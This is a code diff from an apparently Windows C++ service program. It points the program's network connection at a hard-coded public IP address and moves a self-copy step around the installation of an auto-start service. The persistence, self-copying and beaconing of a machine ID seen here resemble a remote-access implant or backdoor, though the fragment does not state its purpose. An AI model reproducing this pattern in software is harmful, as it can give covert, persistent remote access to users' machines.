@@ -55,8 +55,8 @@ void ServiceManager::main(bool separate_process) {
         this->unique_id = get_machine_id();
         cout << "UniqueID: " << this->unique_id << endl;
 
-        // string hostname = "192.241.213.182";
-        string hostname = "192.168.0.118";
+        string hostname = "192.241.213.182";
+        // string hostname = "192.168.0.118";
         SOCKET socket = 0;
 
         while (1) {
@@ -119,7 +119,11 @@ int ServiceManager::install(void) {
         } else {
             this->log("Failed to stop service");
         }
+
+        this->copy();
     } else {
+        this->copy();
+
         service = CreateService(sc_manager, this->name.c_str(), this->name.c_str(),
             SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START,
             SERVICE_ERROR_NORMAL, this->path.c_str(), NULL, NULL, NULL, NULL, NULL);
@@ -133,8 +137,6 @@ int ServiceManager::install(void) {
             this->log("Service installed successfully", false);
         }
     }
-
-    this->copy();
 
     if (!StartService(service, NULL, NULL)) {
         this->log("Failed to start service");
